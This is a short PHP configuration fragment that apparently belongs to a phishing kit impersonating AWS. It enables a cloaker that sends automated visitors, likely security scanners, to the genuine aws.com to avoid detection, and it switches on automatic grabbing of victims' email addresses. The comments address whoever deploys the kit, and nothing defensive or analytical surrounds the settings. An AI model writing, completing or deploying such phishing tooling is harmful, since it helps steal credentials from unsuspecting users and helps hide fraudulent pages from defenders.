...
$cloaker = [
    "url_to_grab" => "https://www.aws.com", // Change the link you want to grap it in your link ( if t)
];

$auto_grabber = true; // Activate Auto Grab Email

$location_bots = "https://www.aws.com"; // Send The Bots To This Link ( If Cloaker Url Empty )
